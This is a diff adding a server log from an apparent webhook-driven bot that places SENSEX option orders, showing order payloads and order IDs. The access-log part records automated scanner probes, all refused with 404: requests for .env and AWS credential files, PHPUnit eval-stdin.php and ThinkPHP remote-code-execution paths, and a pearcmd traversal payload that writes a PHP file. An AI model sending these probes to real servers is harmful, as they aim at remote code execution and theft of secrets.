+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800PE', 'symboltoken': '1112352', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800PE', 'symboltoken': '1112352', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700CE', 'symboltoken': '1109877', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700CE', 'symboltoken': '1109877', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800PE', 'symboltoken': '1112352', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800PE', 'symboltoken': '1112352', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800CE', 'symboltoken': '1111703', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800CE', 'symboltoken': '1111703', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800PE', 'symboltoken': '1112352', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476800PE', 'symboltoken': '1112352', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+[I 240611 09:12:02 smart_api_client:77] OrderId: 240611001380556
+[I 240611 09:12:03 smart_api_client:85] Logout Successful
+2024-06-11 09:12:03,242 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:12:03] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 09:15:31,020 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:15:30Z",\n    "strategy.order.price": "76669.49",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 09:15:31,020 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:15:30Z', 'strategy.order.price': '76669.49', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 09:15:32,071 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 09:15:32 smart_api_client:77] OrderId: 240611001390980
+[I 240611 09:15:33 smart_api_client:77] OrderId: 240611001391003
+[I 240611 09:15:33 smart_api_client:85] Logout Successful
+2024-06-11 09:15:33,593 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:15:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 09:16:58,801 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:16:58] "[33mGET /hudson HTTP/1.0[0m" 404 -
+2024-06-11 09:27:02,903 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:27:00Z",\n    "strategy.order.price": "76672.32",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 09:27:02,903 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:27:00Z', 'strategy.order.price': '76672.32', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 09:27:03,956 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 09:27:04 smart_api_client:77] OrderId: 240611001431900
+[I 240611 09:27:04 smart_api_client:77] OrderId: 240611001431935
+[I 240611 09:27:05 smart_api_client:85] Logout Successful
+2024-06-11 09:27:05,499 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:27:05] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 09:30:30,687 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:30:30Z",\n    "strategy.order.price": "76643.49",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 09:30:30,687 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:30:30Z', 'strategy.order.price': '76643.49', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 09:30:31,702 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 09:30:32 smart_api_client:77] OrderId: 240611001445338
+[I 240611 09:30:32 smart_api_client:77] OrderId: 240611001445369
+[I 240611 09:30:33 smart_api_client:85] Logout Successful
+2024-06-11 09:30:33,242 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:30:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 09:58:39,938 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:58:39] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 09:59:00,891 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T09:59:00Z",\n    "strategy.order.price": "76440.81",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 09:59:00,892 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T09:59:00Z', 'strategy.order.price': '76440.81', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 09:59:02,066 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 09:59:02 smart_api_client:77] OrderId: 240611001583430
+[I 240611 09:59:03 smart_api_client:77] OrderId: 240611001583475
+[I 240611 09:59:03 smart_api_client:85] Logout Successful
+2024-06-11 09:59:03,563 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 09:59:03] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 10:24:07,885 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:24:07] "[33mGET /.git/config HTTP/1.0[0m" 404 -
+2024-06-11 10:37:27,732 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:37:27] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 10:37:28,249 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:37:28] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 10:52:39,586 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:39] "[33mGET /_profiler/phpinfo HTTP/1.0[0m" 404 -
+2024-06-11 10:52:39,795 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:39] "[33mGET /phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 10:52:40,222 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:40] "[33mGET /phpinfo HTTP/1.0[0m" 404 -
+2024-06-11 10:52:40,392 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:40] "[33mGET /aws.yml HTTP/1.0[0m" 404 -
+2024-06-11 10:52:40,779 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:40] "[33mGET /.env.bak HTTP/1.0[0m" 404 -
+2024-06-11 10:52:41,222 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:41] "[33mGET /info.php HTTP/1.0[0m" 404 -
+2024-06-11 10:52:41,462 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:41] "[33mGET /.aws/credentials HTTP/1.0[0m" 404 -
+2024-06-11 10:52:41,596 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:41] "[33mGET /config/aws.yml HTTP/1.0[0m" 404 -
+2024-06-11 10:52:41,704 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:41] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 10:52:42,053 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:52:42] "[33mGET /config.js HTTP/1.0[0m" 404 -
+2024-06-11 10:57:34,968 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:57:34] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 10:57:35,039 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 10:57:35] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 12:35:46,688 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:46] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:46,894 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:46] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:47,091 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:47] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:47,289 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:47] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:47,473 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:47] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:47,652 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:47] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:47,870 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:47] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:48,075 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:48] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:48,298 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:48] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:48,496 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:48] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:48,710 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:48] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:48,911 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:48] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:49,118 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:49] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:49,314 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:49] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:49,524 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:49] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:49,700 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:49] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:49,888 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:49] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:50,102 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:50] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:50,308 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:50] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:50,497 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:50] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:50,700 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:50] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:50,902 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:50] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:51,110 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:51] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:51,296 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:51] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:51,480 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:51] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:51,700 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:51] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:51,888 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:51] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:52,076 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:52] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:52,271 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:52] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:52,509 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:52] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:52,724 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:52] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:52,918 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:52] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:53,115 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:53] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:53,304 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:53] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:53,503 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:53] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:53,689 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:53] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:53,867 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:53] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:54,053 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:54] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+2024-06-11 12:35:54,251 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:54] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+2024-06-11 12:35:54,485 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:54] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.0[0m" 404 -
+2024-06-11 12:35:54,695 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:35:54] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.0[0m" 404 -
+2024-06-11 12:40:51,800 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:40:51] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 12:40:51,869 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:40:51] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 12:55:46,248 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:55:46] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 12:55:46,319 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 12:55:46] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 13:02:08,693 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 13:02:08] "[33mGET /actuator/health HTTP/1.0[0m" 404 -
+2024-06-11 14:12:26,646 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:12:26] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 14:16:40,782 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:16:40] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 14:16:40,852 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:16:40] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 14:27:26,972 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:27:26] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 14:32:43,057 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:43] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 14:32:43,116 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:43] "[33mGET /env HTTP/1.0[0m" 404 -
+2024-06-11 14:32:43,409 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:43] "[33mGET /_profiler/phpinfo HTTP/1.0[0m" 404 -
+2024-06-11 14:32:44,950 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:44] "[33mGET /appsettings.json HTTP/1.0[0m" 404 -
+2024-06-11 14:32:45,012 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:45] "[33mGET /test.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:45,073 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:45] "[33mGET /server.js HTTP/1.0[0m" 404 -
+2024-06-11 14:32:45,358 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:45] "[33mGET /phpinfo HTTP/1.0[0m" 404 -
+2024-06-11 14:32:45,419 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:45] "[33mGET /index.html HTTP/1.0[0m" 404 -
+2024-06-11 14:32:45,742 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:45] "[33mGET /.aws/credentials HTTP/1.0[0m" 404 -
+2024-06-11 14:32:47,891 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:47] "[33mGET /app.js HTTP/1.0[0m" 404 -
+2024-06-11 14:32:47,952 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:47] "[33mGET /index.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:49,029 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:49] "[33mGET /actuator/env HTTP/1.0[0m" 404 -
+2024-06-11 14:32:49,090 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:49] "[33mGET /info HTTP/1.0[0m" 404 -
+2024-06-11 14:32:49,784 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:49] "[33mGET /info.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:50,104 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:50] "[33mGET /test HTTP/1.0[0m" 404 -
+2024-06-11 14:32:50,161 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:50] "[33mGET /php.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:50,222 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:50] "[33mGET /docker-compose.yml HTTP/1.0[0m" 404 -
+2024-06-11 14:32:50,283 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:50] "[33mGET /phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:51,853 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:51] "[33mGET /owncloud/status.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:53,381 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:53] "[33mGET /app/settings.py HTTP/1.0[0m" 404 -
+2024-06-11 14:32:53,441 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:53] "[33mGET /manifest.json HTTP/1.0[0m" 404 -
+2024-06-11 14:32:53,502 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:53] "[33mGET /frontend_dev.php/$ HTTP/1.0[0m" 404 -
+2024-06-11 14:32:53,825 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:53] "[33mGET /webroot/phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:54,143 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:54] "[33mGET /.gitlab-ci.yml HTTP/1.0[0m" 404 -
+2024-06-11 14:32:55,360 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:55] "[33mGET /status.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:55,499 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:55] "[33mGET /dashboard/phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:55,557 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:55] "[33mGET /root/.aws/credentials HTTP/1.0[0m" 404 -
+2024-06-11 14:32:55,615 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:55] "[33mGET /dev/phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:55,926 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:55] "[33mGET /aws.json HTTP/1.0[0m" 404 -
+2024-06-11 14:32:56,966 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:56] "[33mGET /index.php/phpinfo HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,024 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /login/index.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,086 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /php_info.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,148 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /dashboard/admin/phpinfo.php HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,208 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /env.json HTTP/1.0[0m" 404 -
+2024-06-11 14:32:57,269 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 14:32:57] "[33mGET /application-prod.yml HTTP/1.0[0m" 404 -
